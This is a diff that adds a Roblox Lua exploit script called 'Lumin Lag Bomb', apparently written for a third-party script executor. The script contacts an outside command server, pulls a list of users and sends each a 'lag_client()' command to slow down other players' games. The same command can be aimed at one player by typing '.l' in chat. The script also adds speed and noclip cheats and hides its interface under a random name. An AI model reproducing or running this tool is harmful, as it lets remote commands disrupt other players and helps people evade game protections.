@@ -1,0 +1,195 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+
+local request = (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local task, pcall, pairs = task, pcall, pairs
+
+local plr = Players.LocalPlayer
+local api = "https://laggerr-production.up.railway.app"
+
+local function send(target, cmd)
+    pcall(function()
+        request({
+            Url = api .. "/api/commands/" .. target,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({command = cmd})
+        })
+    end)
+end
+
+local function bomb()
+    local s, r = pcall(function()
+        return request({Url = api .. "/api/users", Method = "GET"})
+    end)
+    if s and r and r.StatusCode == 200 then
+        local d = HttpService:JSONDecode(r.Body)
+        if d.success and d.data then
+            for _, u in pairs(d.data) do
+                task.spawn(function() send(u.username, "lag_client()") end)
+            end
+            return #d.data
+        end
+    end
+    return 0
+end
+
+plr.Chatted:Connect(function(m)
+    if m:sub(1, 3) == ".l " then
+        local t = m:sub(4)
+        if t and #t > 0 then send(t, "lag_client()") end
+    end
+end)
+
+local function rnd(len)
+    local s = ""
+    for i = 1, len do s = s .. string.char(math.random(97, 122)) end
+    return s
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = rnd(12)
+gui.Parent = game:GetService("CoreGui")
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local main = Instance.new("Frame", gui)
+main.BorderSizePixel = 0
+main.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+main.Size = UDim2.new(0, 291, 0, 261)
+main.Position = UDim2.new(0.15148, 0, 0.24045, 0)
+
+local c1 = Instance.new("UICorner", main)
+c1.CornerRadius = UDim.new(0, 15)
+
+local s1 = Instance.new("UIStroke", main)
+s1.Thickness = 3
+s1.Color = Color3.fromRGB(137, 0, 255)
+
+local lagbtn = Instance.new("TextButton", main)
+lagbtn.BorderSizePixel = 0
+lagbtn.TextSize = 30
+lagbtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+lagbtn.BackgroundColor3 = Color3.fromRGB(137, 0, 255)
+lagbtn.FontFace = Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+lagbtn.Size = UDim2.new(0, 183, 0, 55)
+lagbtn.Text = "Lag Server"
+lagbtn.Position = UDim2.new(0.18557, 0, 0.27345, 0)
+
+local c2 = Instance.new("UICorner", lagbtn)
+c2.CornerRadius = UDim.new(0, 15)
+
+local title = Instance.new("TextLabel", main)
+title.TextWrapped = true
+title.BorderSizePixel = 0
+title.TextScaled = true
+title.BackgroundTransparency = 1
+title.FontFace = Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Size = UDim2.new(0, 257, 0, 57)
+title.Text = "Lumin Lag Bomb"
+title.Position = UDim2.new(0.05842, 0, 0.05226, 0)
+
+local speedbtn = Instance.new("TextButton", main)
+speedbtn.BorderSizePixel = 0
+speedbtn.TextSize = 30
+speedbtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+speedbtn.BackgroundColor3 = Color3.fromRGB(255, 81, 84)
+speedbtn.FontFace = Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+speedbtn.Size = UDim2.new(0, 183, 0, 55)
+speedbtn.Text = "Speed: OFF"
+speedbtn.Position = UDim2.new(0.18557, 0, 0.51825, 0)
+
+local c3 = Instance.new("UICorner", speedbtn)
+c3.CornerRadius = UDim.new(0, 15)
+
+local noclipbtn = Instance.new("TextButton", main)
+noclipbtn.BorderSizePixel = 0
+noclipbtn.TextSize = 30
+noclipbtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+noclipbtn.BackgroundColor3 = Color3.fromRGB(39, 255, 0)
+noclipbtn.FontFace = Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+noclipbtn.Size = UDim2.new(0, 183, 0, 55)
+noclipbtn.Text = "Noclip: OFF"
+noclipbtn.Position = UDim2.new(0.18557, 0, 0.75708, 0)
+
+local c4 = Instance.new("UICorner", noclipbtn)
+c4.CornerRadius = UDim.new(0, 15)
+
+local dragging, dragInput, dragStart, startPos
+
+local function upd(input)
+    local delta = input.Position - dragStart
+    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+
+main.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then upd(input) end
+end)
+
+lagbtn.MouseButton1Click:Connect(function()
+    lagbtn.Text = "BOMBING..."
+    local n = bomb()
+    lagbtn.Text = "Lagged: " .. n
+    task.delay(2, function() lagbtn.Text = "Lag Server" end)
+end)
+
+local speed = false
+speedbtn.MouseButton1Click:Connect(function()
+    speed = not speed
+    if speed then
+        speedbtn.Text = "Speed: ON"
+        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+            plr.Character.Humanoid.WalkSpeed = 50
+        end
+    else
+        speedbtn.Text = "Speed: OFF"
+        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+            plr.Character.Humanoid.WalkSpeed = 16
+        end
+    end
+end)
+
+local noclip = false
+local nccon
+
+noclipbtn.MouseButton1Click:Connect(function()
+    noclip = not noclip
+    if noclip then
+        noclipbtn.Text = "Noclip: ON"
+        nccon = RunService.Stepped:Connect(function()
+            if plr.Character then
+                for _, p in pairs(plr.Character:GetDescendants()) do
+                    if p:IsA("BasePart") then p.CanCollide = false end
+                end
+            end
+        end)
+    else
+        noclipbtn.Text = "Noclip: OFF"
+        if nccon then nccon:Disconnect() nccon = nil end
+        if plr.Character then
+            for _, p in pairs(plr.Character:GetDescendants()) do
+                if p:IsA("BasePart") then p.CanCollide = true end
+            end
+        end
+    end
+end)
+
